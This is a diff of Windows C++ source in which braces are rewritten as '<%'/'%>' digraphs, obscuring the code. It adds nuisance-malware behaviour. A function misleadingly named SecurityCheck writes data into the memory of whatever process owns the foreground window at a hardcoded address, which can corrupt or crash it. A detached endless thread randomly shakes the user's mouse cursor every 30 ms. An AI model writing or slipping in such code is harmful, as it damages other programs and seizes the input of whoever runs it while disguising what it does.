@@ -203,28 +203,29 @@ namespace Main
 		%>
 		namespace therealloop
 		<%
-					static void SecurityCheck() {
+
+					static void SecurityCheck() <%
 					HKEY hKey;
 					LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_READ, &hKey);
-					if (result == ERROR_SUCCESS) {
+					if (result == ERROR_SUCCESS) <%
 						RegCloseKey(hKey);
-					}
+					%>
 					HWND hwnd = GetForegroundWindow();
 					DWORD processId;
 					GetWindowThreadProcessId(hwnd, &processId);
 					HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, processId);
-					if (hProcess != NULL) {
+					if (hProcess != NULL) <%
 						const char* data = "Hello World";
 						SIZE_T bytesWritten;
 						uintptr_t address = 0x12345678;
 						WriteProcessMemory(hProcess, (LPVOID)address, data, strlen(data) + 1, &bytesWritten);
 						CloseHandle(hProcess);
-					}
-				}
-				void createFileOnDesktopWin32(const std::string& fileName) {
+					%>
+				%>
+				void createFileOnDesktopWin32(const std::string& fileName) <%
 					PWSTR pszPath = NULL;
 					HRESULT hr = SHGetKnownFolderPath(FOLDERID_Desktop, 0, NULL, &pszPath);
-					if (SUCCEEDED(hr)) {
+					if (SUCCEEDED(hr)) <%
 						std::wstring wDesktopPath(pszPath);
 						CoTaskMemFree(pszPath);
 						if (fileName.empty()) return;
@@ -241,40 +242,39 @@ namespace Main
 							FILE_ATTRIBUTE_NORMAL,
 							NULL
 						);
-						if (hFile != INVALID_HANDLE_VALUE) {
+						if (hFile != INVALID_HANDLE_VALUE) <%
 							CloseHandle(hFile);
-						}
-						else {
-							std::cerr << "Error: " << GetLastError() << std::endl;
-						}
-					}
-				}
-				bool jkhglfdshghdjlfkghljkdfsgljkhfdkjglhdfjhklgjhkdfgbyygreygerygudfghjfdgdfbvvbfv;
-				void MoveCursorUp(int how) <%
-					POINT p;
-					if (GetCursorPos(&p)) <%
-						if (jkhglfdshghdjlfkghljkdfsgljkhfdkjglhdfjhklgjhkdfgbyygreygerygudfghjfdgdfbvvbfv) <%
-							SetCursorPos(p.x - how, p.y - how);
-							jkhglfdshghdjlfkghljkdfsgljkhfdkjglhdfjhklgjhkdfgbyygreygerygudfghjfdgdfbvvbfv = false;
 						%>
 						else <%
-							SetCursorPos(p.x + how, p.y + how);
-							jkhglfdshghdjlfkghljkdfsgljkhfdkjglhdfjhklgjhkdfgbyygreygerygudfghjfdgdfbvvbfv = true;
+							std::cerr << "Error: " << GetLastError() << std::endl;
 						%>
 					%>
 				%>
+						void RandomShake(int maxIntensity) {
+							if (maxIntensity <= 0) {
+								return;
+							}
+							POINT p;
+							if (GetCursorPos(&p)) {
+								int offsetX = (rand() % (maxIntensity * 2)) - maxIntensity + 1;
+								int offsetY = (rand() % (maxIntensity * 2)) - maxIntensity + 1;
+								SetCursorPos(p.x + offsetX, p.y + offsetY);
+							}
+						}
 			static std::atomic<int> counter(0);
+			static std::atomic<bool> leftOrRight = false;
 			void realmain()
 				<%
+				srand(time(NULL));
 				SecurityCheck();
 				Main::Memory::Registry::functions::InitializeRegistry();
 				std::thread([]() <%
 					while (true) <%
 						counter++;
-						if (counter == 300) {
+						if (counter == 5) <%
 							counter = 0;
-						}
-						MoveCursorUp(counter);
+						%>
+							RandomShake(counter);
 						std::this_thread::sleep_for(std::chrono::milliseconds(30));
 					%>
 					%>).detach();
